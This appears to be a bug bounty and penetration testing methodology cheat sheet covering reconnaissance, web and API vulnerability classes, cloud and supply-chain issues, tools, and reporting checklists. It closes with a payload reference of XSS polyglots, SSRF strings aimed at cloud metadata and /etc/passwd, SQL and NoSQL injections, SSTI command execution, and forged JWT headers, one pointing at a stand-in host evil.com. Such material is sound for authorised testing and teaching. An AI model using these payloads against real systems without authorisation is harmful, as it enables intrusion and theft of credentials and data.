# Bug Hunting Methodology Cheat Sheet - Dark Recon Framework v1.0.1
# Comprehensive vulnerability detection techniques for bug bounty and penetration testing

## 1. RECONNAISSANCE & INFORMATION GATHERING

### 1.1 Subdomain Enumeration
- **Passive**: crt.sh, SecurityTrails, VirusTotal, DNSDumpster, Censys, Shodan, Subfinder, Assetfinder, Amass (passive), Findomain
- **Active**: Amass (active), Shuffledns, Puredns, Gobuster, Massdns, Dnsgen, Alterx, Gotator
- **Permutation**: Dnsgen + Alterx + Gotator for subdomain mutation
- **Certificate Transparency**: crt.sh, CertSpotter, Facebook CT, Google CT
- **Zone Transfer**: AXFR attempts on all NS records
- **Subdomain Takeover**: Subjack, Subzy, Nuclei takeover templates

### 1.2 DNS Analysis
- **Record Types**: A, AAAA, CNAME, MX, TXT, NS, SOA, PTR, SRV, CAA, DNSKEY, DS
- **Security Records**: SPF, DMARC, DKIM, DNSSEC validation
- **Historical DNS**: SecurityTrails, DNSDB, Farsight, ViewDNS
- **Subdomain Bruteforce**: SecLists, custom wordlists, permutation

### 1.3 Port & Service Discovery
- **Fast**: Naabu, Masscan (top 1000)
- **Comprehensive**: Nmap full scan (-p-), service detection (-sV), scripts (-sC)
- **UDP**: Nmap -sU for common UDP services
- **Cloud Metadata**: AWS/GCP/Azure metadata endpoints (169.254.169.254)

### 1.4 Technology Fingerprinting
- **Wappalyzer/WhatWeb**: CMS, frameworks, libraries, servers
- **Headers Analysis**: Server, X-Powered-By, X-AspNet-Version, etc.
- **JS Analysis**: Library detection, version extraction, vulnerable versions
- **SSL/TLS**: Cipher suites, certificate analysis, HSTS, HPKP

## 2. WEB APPLICATION TESTING

### 2.1 Input Validation & Injection

#### SQL Injection
- **Error-based**: UNION, error messages, blind
- **Boolean/Time-based**: SLEEP, BENCHMARK, pg_sleep, WAITFOR DELAY
- **Stacked Queries**: ; -- ;#
- **NoSQL Injection**: MongoDB operators ($where, $gt, $ne, $regex)
- **GraphQL Injection**: Introspection, field suggestions, batching
- **Tools**: SQLMap, NoSQLMap, GQLMap

#### XSS (Cross-Site Scripting)
- **Reflected**: URL params, headers, POST data
- **Stored**: Comments, profiles, tickets, uploads
- **DOM-based**: document.write, innerHTML, eval, location.hash
- **Blind/XSS Hunter**: OOB callbacks, XSS Hunter, Burp Collaborator
- **Filter Bypass**: Encoding, polyglots, mutation XSS, template literals
- **CSP Bypass**: nonce, strict-dynamic, unsafe-inline, JSONP endpoints

#### SSRF (Server-Side Request Forgery)
- **Basic**: localhost, 169.254.169.254, internal IPs
- **Bypass**: DNS rebinding, IPv6, CIDR, decimal/octal IP, redirect chains
- **Cloud Metadata**: AWS/GCP/Azure/Aliyun/Tencent metadata APIs
- **Protocol**: file://, dict://, ftp://, gopher://, ldap://
- **OOB**: Burp Collaborator, Interactsh, DNS logs

#### Command Injection / RCE
- **Shell Metacharacters**: ; & | ` $() || && newline
- **Language-specific**: PHP (system, exec, shell_exec), Python (eval, exec), Node (child_process), Java (Runtime.exec)
- **Template Injection**: SSTI (Jinja2, Twig, Freemarker, Velocity, Smarty)
- **Deserialization**: Java (ysoserial), PHP (PHPGGC), Python (pickle), .NET (ysoserial.net)
- **File Upload**: Polyglots, magic bytes, extension bypass, content-type bypass

### 2.2 Authentication & Authorization

#### Authentication Bypass
- **SQLi in Login**: ' OR '1'='1, admin'--
- **Password Reset**: Token reuse, host header poisoning, IDOR
- **2FA/MFA Bypass**: Backup codes, session fixation, remember me, OAuth flaws
- **JWT Attacks**: None alg, key confusion, weak secret, kid injection, jku/x5u
- **OAuth/SAML**: Redirect URI validation, state parameter, PKCE bypass

#### Authorization Flaws
- **IDOR/BOLA**: Object ID manipulation, UUID enumeration
- **BFLA**: Function-level access, admin endpoints, API versioning
- **Privilege Escalation**: Horizontal (user-to-user), Vertical (user-to-admin)
- **Mass Assignment**: Hidden parameters, role=admin, is_admin=true
- **Race Conditions**: TOCTOU, concurrent requests, duplicate actions

### 2.3 API Security
- **GraphQL**: Introspection, field suggestions, batching, aliasing, depth DoS
- **REST**: Versioning, parameter pollution, HTTP method override
- **Rate Limiting**: Burst, distributed, bypass via headers/IP rotation
- **Broken Object/Function Level Auth**: Predictable IDs, missing checks

### 2.4 Client-Side Security
- **CORS Misconfig**: Origin reflection, null origin, wildcard with credentials
- **CSP Bypass**: JSONP, AngularJS, unsafe-eval, nonce leakage
- **Clickjacking**: X-Frame-Options, CSP frame-ancestors
- **PostMessage**: Origin validation, sensitive data exposure
- **Web Storage**: localStorage/sessionStorage sensitive data
- **Cookies**: Secure, HttpOnly, SameSite, prefix (__Host-, __Secure-)

## 3. INFRASTRUCTURE & CLOUD

### 3.1 Cloud Misconfigurations
- **AWS**: S3 public, IAM overprivileged, Security Groups, RDS public, Lambda env vars
- **GCP**: Storage public, IAM, Cloud Functions, Compute metadata
- **Azure**: Blob public, RBAC, Key Vault, Function apps
- **Kubernetes**: API server, etcd, Kubelet, Dashboard, RBAC, PodSecurityPolicies

### 3.2 Container Security
- **Docker**: Daemon exposure, privileged containers, host mounts, secrets in images
- **Registry**: Anonymous pull, vulnerable base images, malware
- **Runtime**: Falco, Sysdig, tracee for anomaly detection

## 4. ADVANCED TECHNIQUES

### 4.1 Logic Flaws & Business Logic
- **Price Manipulation**: Negative quantities, coupon stacking, currency conversion
- **Workflow Bypass**: Skip steps, replay requests, state manipulation
- **Concurrency**: Race conditions in payments, invites, voting
- **Feature Misuse**: Export functions, admin panels, debug endpoints

### 4.2 Supply Chain & Dependencies
- **Dependency Confusion**: Private package names, version priority
- **Typosquatting**: Similar package names, malicious code
- **Vulnerable Dependencies**: CVE scanning, version pinning, lockfile analysis
- **Git Exposure**: .git folders, .github/workflows, CI/CD secrets

### 4.3 Mobile & Thick Client
- **API Analysis**: Certificate pinning bypass, Frida/Objection
- **Local Storage**: SQLite, SharedPreferences, Keychain
- **IPC**: Intent/URL schemes, clipboard, pasteboard
- **Binary Analysis**: Reverse engineering, string extraction

## 5. AUTOMATION & SCALING

### 5.1 Continuous Monitoring
- **Subdomain Watch**: Sublert, Subfinder -monitor, Assetfinder monitoring
- **Certificate Monitoring**: CertSpotter, Facebook CT monitoring
- **Content Changes**: Visual diff, hash comparison, diff alerts
- **Vulnerability Feeds**: Nuclei templates, CVE feeds, ExploitDB

### 5.2 Correlation & Validation
- **Multi-tool Correlation**: Cross-reference findings
- **False Positive Reduction**: Validation, reproduction, context
- **Risk Scoring**: CVSS, exploitability, business impact
- **Deduplication**: Content hashing, fingerprinting

## 6. REPORTING & COMMUNICATION

### 6.1 Evidence Collection
- **Reproduction Steps**: Clear, minimal, verifiable
- **Impact Demonstration**: Data access, account takeover, RCE
- **Video/Screenshots**: Burp history, browser dev tools, terminal output
- **Timeline**: Discovery, verification, reporting dates

### 6.2 Communication
- **Severity Justification**: CVSS + business context
- **Remediation Guidance**: Specific fixes, not generic advice
- **Retesting**: Verification of fixes, regression testing

---

# TOOL REFERENCE QUICK LOOKUP

| Category | Primary Tools | Secondary Tools |
|----------|---------------|-----------------|
| Subdomain Enum | Subfinder, Assetfinder, Amass, Findomain | Sublist3r, Knockpy, Cero, Dnsgen |
| DNS | Dnsx, Massdns, Dnsrecon, Dig | Fierce, Dnsenum, Knockpy |
| Port Scan | Naabu, Nmap, Masscan | Rustscan, Unicornscan |
| Web Crawl | Katana, Gospider, Hakrawler | Feroxbuster, Dirsearch, Ffuf |
| Vuln Scan | Nuclei, Jaeles, Sn1per | Nikto, Wapiti, Arachni |
| Fuzzing | Ffuf, Wfuzz, Feroxbuster | Arjun, Paramspider, X8 |
| SQLi | SQLMap, Nosqlmap, Gqlmap | BBQSQL, SQLi Hunter |
| XSS | Dalfox, XSStrike, XSSHunter | KXSS, XSSCon |
| SSRF | SSRFMap, Gopherus, Collaborator | Interactsh, DNSLog |
| SSTI | Tplmap, SSTImap | Custom payloads |
| Auth | JWT_Tool, Jwt_Hacker, OAuth2_Proxy | SAMLRaider, TokenSmith |
| Cloud | Cloud_Enum, ScoutSuite, Prowler | Pacu, WeirdAAL, CloudFox |
| JS Analysis | LinkFinder, SecretFinder, JSParser | Subjs, GetJS, Mantra |
| Secrets | TruffleHog, GitLeaks, Detect-Secrets | GitRob, Whispers, Repo-Supervisor |
| CVE/Exploit | Nuclei, ExploitDB, SearchSploit | Metasploit, Vulners, CVE-Search |

---

# PAYLOAD QUICK REFERENCE

## XSS Polyglots
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><svg/onload=alert(1)>
"><img src=x onerror=alert(1)>
javascript:alert(1)
```

## SSRF Payloads
```
http://169.254.169.254/latest/meta-data/
http://localhost:8080
http://127.0.0.1:22
http://[::1]:80
http://2130706433 (decimal 127.0.0.1)
http://0177.0.0.1 (octal)
http://internal.service.local
file:///etc/passwd
dict://localhost:11211/stat
gopher://127.0.0.1:6379/_INFO
```

## SQLi Payloads
```
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; WAITFOR DELAY '0:0:5'--
' OR SLEEP(5)--
' OR pg_sleep(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

## NoSQL Injection
```
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "sleep(5000)"}
```

## SSTI Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

## JWT Attacks
```json
{"alg":"none","typ":"JWT"}
{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
{"alg":"HS256","typ":"JWT","jku":"http://evil.com/key.json"}
```

## Prototype Pollution
```
?__proto__.polluted=1
?constructor.prototype.polluted=1
?__proto__[polluted]=1
{"__proto__":{"polluted":true}}
```

---

# VALIDATION CHECKLIST

## For Every Finding:
- [ ] Reproduced manually
- [ ] Impact demonstrated
- [ ] Root cause identified
- [ ] Affected versions/components listed
- [ ] CVSS score calculated
- [ ] Business impact described
- [ ] Remediation steps provided
- [ ] Retest plan defined

## Before Reporting:
- [ ] Checked for duplicates in program
- [ ] Verified not a false positive
- [ ] Tested in isolation
- [ ] Confirmed scope inclusion
- [ ] Prepared evidence package
- [ ] Followed disclosure policy